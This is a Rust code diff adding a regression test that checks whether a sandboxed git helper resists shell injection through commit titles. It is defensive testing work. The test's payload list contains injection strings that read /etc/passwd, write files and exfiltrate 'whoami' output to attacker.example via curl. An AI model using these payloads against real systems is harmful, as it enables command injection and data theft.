@@ -3,7 +3,7 @@ use std::sync::Mutex;
 
 use serde_json::Value;
 
-use super::git_in_sandbox::CheckpointGitError;
+use super::git_in_sandbox::{CheckpointGitError, SandboxGitShell};
 use super::label_buffer::CheckpointLabelBuffer;
 use super::persistence::CheckpointStore;
 use super::routes::{ListQuery, RouteOutcome, list_checkpoints};
@@ -290,6 +290,141 @@ async fn http_checkpoints_list_route_returns_paginated_json() {
         }
         _ => panic!("expected Ok"),
     }
+}
+
+/// Story 2.19 / Phase 1 DEBT #14 regression — `commit_phase` must
+/// never interpolate `phase_title` into the shell command line.
+/// Feeds malicious payloads and asserts the captured shell commands
+/// don't contain any of them.
+#[tokio::test]
+async fn commit_phase_does_not_shell_inject() {
+    use crate::sandbox::{SandboxClient, SandboxHandle};
+    use wiremock::matchers::{method, path};
+    use wiremock::{Mock, MockServer, ResponseTemplate};
+
+    let server = MockServer::start().await;
+    let workspace_root = tempfile::tempdir().expect("workspace tmp");
+    let session_workspace = workspace_root.path().join("sess-inject");
+    std::fs::create_dir_all(&session_workspace).expect("session workspace dir");
+
+    // Every /v1/shell/exec call succeeds. The git rev-parse HEAD call
+    // returns a known SHA so commit_phase resolves cleanly.
+    Mock::given(method("POST"))
+        .and(path("/v1/shell/exec"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "exit_code": 0,
+            "stdout": "deadbeefcafebabe1234567890\n",
+            "stderr": ""
+        })))
+        .mount(&server)
+        .await;
+
+    let sandbox = SandboxClient::new(
+        "ghcr.io/agent-infra/sandbox:1.0.0.152",
+        workspace_root.path(),
+    )
+    .expect("sandbox client");
+    sandbox
+        .insert_handle_for_test(SandboxHandle {
+            session_id: "sess-inject".into(),
+            container_id: "c1".into(),
+            api_url: server.uri(),
+            novnc_url: "http://127.0.0.1:1".into(),
+            ttyd_url: "ws://127.0.0.1:2".into(),
+            workspace_host_path: session_workspace.clone(),
+        })
+        .await;
+    let sandbox = Arc::new(sandbox);
+    let shell = SandboxGitShell::new(sandbox);
+
+    // Malicious phase_title payloads. Each tests a different injection
+    // primitive Phase 1 DEBT #14 warned about.
+    let payloads: &[&str] = &[
+        "`whoami`",
+        "$(id)",
+        "; touch /tmp/sh_pwned",
+        "\n; cat /etc/passwd",
+        "\"; echo INJECTED >> /tmp/sh_pwned; echo \"",
+        "$(curl http://attacker.example/$(whoami))",
+    ];
+    for (idx, title) in payloads.iter().enumerate() {
+        // Use distinct phase_id per payload so each gets its own
+        // /workspace/.commit-msg/<id>.txt file and they don't collide.
+        shell
+            .commit_phase("sess-inject", 1000 + idx as i64, title)
+            .await
+            .expect("commit_phase succeeds");
+    }
+
+    // Collect every shell command body the SandboxGitShell sent.
+    let received = server.received_requests().await.expect("received_requests");
+    let commands: Vec<String> = received
+        .iter()
+        .filter_map(|req| serde_json::from_slice::<Value>(&req.body).ok())
+        .filter_map(|body| {
+            body.get("command")
+                .and_then(Value::as_str)
+                .map(str::to_string)
+        })
+        .collect();
+
+    // Sanity: at least 4 commands per payload (add, commit, rm, rev-parse)
+    // × 6 payloads = 24 minimum.
+    assert!(
+        commands.len() >= 24,
+        "expected ≥24 shell-exec calls; got {}: {:?}",
+        commands.len(),
+        commands
+    );
+
+    // The actual invariant: no malicious payload string appears in any
+    // shell command. If any did, the shell would interpret it.
+    let danger_substrings: &[&str] = &[
+        "`whoami`",
+        "$(id)",
+        "; touch /tmp/sh_pwned",
+        "; cat /etc/passwd",
+        "echo INJECTED",
+        "$(curl",
+        "$(whoami)",
+    ];
+    for cmd in &commands {
+        for needle in danger_substrings {
+            assert!(
+                !cmd.contains(needle),
+                "shell-exec command contains injection {:?}: {:?}",
+                needle,
+                cmd
+            );
+        }
+    }
+
+    // Positive assertion: the commit step uses `-F /workspace/.commit-msg/<id>.txt`
+    // and never `-m "..."`.
+    let commit_cmds: Vec<&String> = commands
+        .iter()
+        .filter(|c| c.contains("git -C /workspace commit"))
+        .collect();
+    assert_eq!(commit_cmds.len(), payloads.len());
+    for cmd in commit_cmds {
+        assert!(
+            cmd.contains("-F /workspace/.commit-msg/"),
+            "commit should use -F file path: {cmd}"
+        );
+        assert!(
+            !cmd.contains("-m "),
+            "commit must not use -m \"...\" form: {cmd}"
+        );
+    }
+
+    // The commit-message files do carry the raw phase_title bytes;
+    // verify at least one (we wrote them to the host-fs workspace mount).
+    let msg_path = session_workspace.join(".commit-msg/1000.txt");
+    let content = std::fs::read_to_string(&msg_path).expect("commit-msg file");
+    assert!(content.contains("`whoami`"));
+
+    // Cleanup happens server-side via `rm -f` (which is mocked); the
+    // host-fs files stay (that's fine for the test).
 }
 
 #[tokio::test]
